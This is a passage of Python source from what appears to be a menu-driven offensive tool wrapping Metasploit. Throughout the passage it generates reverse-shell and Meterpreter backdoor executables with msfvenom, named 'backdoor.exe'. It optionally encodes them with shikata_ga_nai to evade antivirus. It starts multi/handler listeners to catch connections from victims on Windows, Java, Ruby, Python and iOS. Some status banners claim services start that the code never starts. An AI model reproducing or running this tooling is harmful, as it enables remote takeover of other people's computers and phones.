                   cat = ""
                   python_pay = str(input("[:@ ]> "))
                   begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] STARTING POSTGRSQL")
                   begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
                   begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
                   begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
                   begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
                   begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
                   begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] STARTING LISTNER")
                   begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] LISTENR STARTED")
                   begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
                   begining.slowprints2("[\u2713] ALL DONE")
                   begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
                   if python_pay == "1":
                       cat = "python/shell_reverse_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
                   elif python_pay == "2":
                       cat = "python/meterpreter/reverse_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
                   elif python_pay == "back":
                       begining.menu()
                       work.works()
                   else:
                       begining.ext()

            elif payl == "7":
              print("""
[1] > ruby/shell_reverse_tcp_ssl
[2] > ruby/shell_reverse_tcp
[3] > ruby/shell_bind_tcp_ipv6
[4] > ruby/shell_bind_tcp

   [back] > ( Back To Menu )
""")
              cat = ""
              ruby = str(input("[:@ ]> "))
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING POSTGRSQL")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING LISTNER")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] LISTENR STARTED")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] ALL DONE")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              if ruby == "1":
                       cat = "ruby/shell_reverse_tcp_ssl"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif ruby == "2":
                       cat = "ruby/shell_reverse_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif ruby == "3":
                       cat = "ruby/shell_bind_tcp_ipv6"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif ruby == "4":
                       cat = "ruby/shell_bind_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif ruby == "back":
                       begining.menu()
                       work.works()
              else:
                       begining.ext()

            elif payl == "8":
              print("""
[1] > java/meterpreter/reverse_http
[2] > java/meterpreter/reverse_https
[3] > java/meterpreter/reverse_tcp
[4] > java/shell/reverse_tcp
[5] > java/meterpreter/bind_tcp
[6] > java/shell/bind_tcp

[back] > ( Back To Menu )
""")            
              java = str(input("[:@ ]> "))
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING POSTGRSQL")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING LISTNER")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] LISTENR STARTED")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] ALL DONE")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              if java == "1":
                       cat = "java/meterpreter/reverse_http"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif java == "2":
                       cat = "java/meterpreter/reverse_https"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif java == "3":
                       cat = "java/meterpreter/reverse_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif java == "4":
                       cat = "java/shell_reverse_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif java == "5":
                       cat = "java/meterpreter/bind_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif java == "6":
                       cat = "java/shell/bind_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()

              elif java == "back":
                       begining.menu()
                       work.works()
              else:
                       begining.ext()
               
            elif payl == "9":
              print("""
[1] > apple_ios/aarch64/meterpreter_reverse_http
[2] > apple_ios/aarch64/meterpreter_reverse_https
[3] > apple_ios/aarch64/meterpreter_reverse_tcp
[4] > apple_ios/aarch64/shell_reverse_tcp

         [back] > ( Back To Menu)
""")
              appl = str(input("[:@ ]> "))
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING POSTGRSQL")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] SERVICE POSTGRSQL STARTED")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING METASPLOIT DATABASE")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] METASPLOIT DATABASE STARTED")
              begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING MSFCONSOLE")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] MSFCONSOLE STARTED")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] STARTING LISTNER")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] LISTENR STARTED")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              begining.slowprints2("[\u2713] ALL DONE")
              begining.slowprints2(begining.yellow + "[#################################################################################]" + begining.end)
              if appl == "1":
                       cat = "apple_ios/aarch64/meterpreter_reverse_http"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif appl == "2":
                       cat = "apple_ios/aarch64/meterpreter_reverse_https"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif appl == "3":
                       cat = "apple_ios/aarch64/meterpreter_reverse_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif appl == "4":
                       cat = "apple_ios/aarch64/shell_reverse_tcp"
                       os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host,port,cat))
                       work.back()
              elif appl == "back":
                       begining.menu()
                       work.works()
              else:
                      begining.ext()

            elif payl == "99" :
                begining.menu()
                work.works()
   
            else:
                begining.ext()

        elif your_choice == "4":
            url = "http://ip.42.pl/raw"
            open_u = urllib.request.urlopen(url).read()
            open_u = open_u.decode('utf-8')
            begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
            input("Hit Enter To Continue ")
            work.works()
 
        elif your_choice == "0":
            begining.ExT()
        elif your_choice == "1":
            begining.slowprints1    ("""
PAYLOADS AVAIBLE :
 
[1] > Windows
[2] > MAC OX
[3] > Linux
[4] > Android
[5] > PHP
[6] > Python
[7] > Ruby
[8] > Java
[9] > apple_ios
""")
            paylo = str(input("[@: ]>  "))
            cats = ""
            if paylo == "1":
                print("""
[1] > windows/shell/reverse_tcp
[2] > windows/meterpreter/reverse_http
[3] > windows/meterpreter/reverse_https
[4] > windows/meterpreter/reverse_tcp
[5] > windows/meterpreter_reverse_http
[6] > windows/meterpreter_reverse_https
[7] > windows/meterpreter_reverse_tcp
""")
                winp = str(input("[:@ ]> "))
                print("")
                url = "http://ip.42.pl/raw"
                open_u = urllib.request.urlopen(url).read()
                open_u = open_u.decode('utf-8')
                begining.slowprints1("Your Public IP Adress is: {}".format(begining.green+open_u+begining.end))
                print("")
                host1 = str(input("LHOST==>"))
                port1 = str(input("LPORT==>"))
                print("")
                begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                if winp == "1":
                    bassem = str(input("[?] Do you wanna encode your payload with x86/shikata_ga_nai Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/shell/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f exe -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/shell/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                         
                                     
                elif winp == "2":
                    bassem = str(input("[?] Do you wanna encode your payload with x86/shikata_ga_nai Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_http LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/meterpreter/reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_http LHOST={0} LPORT={1} -f exe -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/meterpreter/reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()              
                 
                           
                           
                elif winp == "3":
                    bassem = str(input("[?] Do you wanna encode your payload with x86/shikata_ga_nai Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_https LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/meterpreter/reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_https LHOST={0} LPORT={1} -f exe -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/meterpreter/reverse_https"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()              
                           
                elif winp == "4":
                    bassem = str(input("[?] Do you wanna encode your payload with x86/shikata_ga_nai Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/meterpreter/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/meterpreter/reverse_tcp"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()                
                           
                elif winp == "5":
                    bassem = str(input("[?] Do you wanna encode your payload with x86/shikata_ga_nai Y/n : "))
                    bassl = "yEs"
                    x = bassl.upper()
                    y = bassl.swapcase()
                    if bassem == "Yes" or bassem == "yes" or bassem == "y" or bassem == "Y" or bassem == x or bassem == y :
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe -e x86/shikata_ga_nai -i 3 -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":  
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:                          
                            cat = "windows/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                                                         
                    else:
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[/] CREATING PAYLOAD PLEASE WAIT !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        os.system("sudo msfvenom --platform windows -p windows/meterpreter_reverse_http LHOST={0} LPORT={1} -f exe -o backdoor.exe".format(host1,port1))
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                        begining.slowprints2("[\u2713] PAYLOAD CREATED SUCCESSFULY !!")
                        begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)      
                        Djebbar = str(input("[?] Do you wanna start a listner Y/n : "))
                        if Djebbar == "n" or Djebbar == "N" or Djebbar == "No" or Djebbar == "no" or Djebbar == "NO" or Djebbar == "NON":
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[-] LISTNER NOT STARTED  !!")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.slowprints2("[\u2713] ALL DONE")
                            begining.slowprints2(begining.yellow +"[#################################################################################]" + begining.end)
                            begining.ext()
                        else:        
                            cat = "windows/meterpreter_reverse_http"
                            os.system("xterm -T 'START LISTINER ' -geometry '80x30+2000+0' -e ""sudo msfconsole -x 'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD {2}; exploit'".format(host1,port1,cat))
